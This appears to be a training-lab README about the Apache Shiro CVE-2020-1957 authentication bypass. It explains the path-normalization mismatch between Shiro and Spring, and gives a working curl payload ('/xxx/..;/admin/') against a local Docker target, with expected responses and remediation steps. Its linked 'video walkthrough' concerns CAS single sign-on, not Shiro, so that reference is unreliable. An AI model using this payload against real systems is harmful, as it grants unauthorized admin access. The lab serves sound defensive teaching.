# Apache Shiro Ant-Style Path Normalization Authentication Bypass (CVE-2020-1957)

## Laboratory Overview

This laboratory provides an isolated, production-grade practice target for studying **Apache Shiro Ant-Style Path Normalization Authentication Bypass (CVE-2020-1957)**.

- **Target Directory**: `Classes/02_web_penetration_tester/07_08_09_10_auth_and_access_control/shiro_path_traversal_bypass`
- **Default Port(s)**: `8219:8080` (Host: `http://localhost:8219`, Container: `8080`)
- **CLI Shortcut**: `./lab start shiro-path-bypass`

---

## Upstream Citations & Source of Truth

- **Vulhub Upstream Environment**: [Vulhub CVE-2020-1957 Repository](https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2020-1957)
- **Apache Shiro Security Patch Commit**: [Commit 3708d79 Fix](https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce#diff-98f7bc5c0391389e56531f8b3754081aL139)
- **Technical Analysis & Root Cause Writeups**:
  - [Spoock Security: CVE-2020-1957 Shiro Bypass Analysis](https://blog.spoock.com/2020/05/09/cve-2020-1957/)
  - [Alibaba Cloud XZ Community Analysis](https://xz.aliyun.com/t/8281)

---

## Architecture & Service Map

- **Container Name**: `cyberlab_02_shiro_1957`
- **Upstream Image**: `vulhub/shiro:1.5.1`
- **Pull Policy**: `missing`
- **Network Mode**: Bridge (Isolated Docker network)
- **Resource Ceiling**: 1024 MB RAM limit
- **Application Framework**: Spring Boot 2.2.2 with Apache Shiro 1.5.1

---

## Vulnerability Mechanics & Technical Root Cause

### Desynchronization Between Shiro Filter and Spring MVC Routing

The vulnerability stems from an impedance mismatch in URI normalization between **Apache Shiro** (prior to version 1.5.2) and **Spring MVC** (`DispatcherServlet`).

1. **Shiro Filter Chain Interception**:
   - In Spring Boot with Shiro, Shiro registers a servlet filter chain (`ShiroFilterFactoryBean`) that checks requests before they reach Spring controllers.
   - The security configuration specifies access rules such as:
     ```java
     chainDefinition.addPathDefinition("/admin/**", "authc");
     ```
   - When resolving the target path, Shiro's `WebUtils.getPathWithinApplication()` inspects `request.getRequestURI()`.
   - When evaluating an incoming request such as `/xxx/..;/admin/`, Shiro's Ant-style path matcher treats the token `..;` as part of the directory segment without executing parent-directory normalization. Because `/xxx/..;/admin/` does not match pattern `/admin/**`, Shiro permits the request unauthenticated through the filter chain.

2. **Spring MVC Dispatcher Processing**:
   - Once Shiro allows the request through, Spring's `UrlPathHelper` processes the request URL.
   - Spring strips matrix parameters at semicolons (`removeSemicolonContent = true` by default) and normalizes path traversals (`/xxx/../admin/` -> `/admin/`).
   - Spring routes the request to `@RequestMapping("/admin/")` inside `AccountInfoController`, serving the restricted admin resource without authentication.

---

## Exploitation Walkthrough

### 1. Start the Environment

```bash
cd Classes/02_web_penetration_tester/07_08_09_10_auth_and_access_control/shiro_path_traversal_bypass
docker compose up -d
```

### 2. Verify Baseline Authentication Protection

Attempting to directly request the protected `/admin/` resource without a valid session cookie returns a 302 redirect to the login page:

```bash
curl -i http://localhost:8219/admin/
```

**Expected Response**:

```http
HTTP/1.1 302
Set-Cookie: JSESSIONID=...; Path=/; HttpOnly; SameSite=lax
Location: http://localhost:8219/login.html
Content-Length: 0
```

### 3. Exploit Path Normalization Bypass

Craft a request inserting a non-existent prefix and the `..;` traversal sequence:

```bash
curl -i "http://localhost:8219/xxx/..;/admin/"
```

**Expected Response**:

```http
HTTP/1.1 200
Content-Type: text/html;charset=UTF-8
Content-Language: en

<!DOCTYPE HTML>
<html>
    <head>
        <title>Account Info</title>
...
        <div class="container">
            <h1>Account Info Page for: World!</h1>
...
```

The protected admin console `/admin/` is retrieved directly without requiring login credentials or valid session tokens.

---

## Defensive Remediation & Hardening

1. **Upgrade Apache Shiro**:
   Upgrade Apache Shiro to version `1.5.2` or later. The patch updates `WebUtils.getPathWithinApplication()` and normalizes semicolon path sequences before evaluating Ant patterns.
2. **Synchronize URI Normalization**:
   Ensure edge reverse proxies (such as Nginx or Traefik) and WAFs reject or normalize semicolons in URL paths before forwarding requests to backend application servers.
3. **Spring MVC Configuration**:
   Disable URL path normalization discrepancies by aligning `alwaysUseFullPath` and matrix parameter settings across filter chains and controllers.

---

## Verified Video Walkthrough

- **Video Title**: [CAS Quick Tour - Apereo's Central Authentication Service (CAS) Single Sign-On](https://www.youtube.com/watch?v=TZUg4PUfS1M)
- **Direct URL**: https://www.youtube.com/watch?v=TZUg4PUfS1M
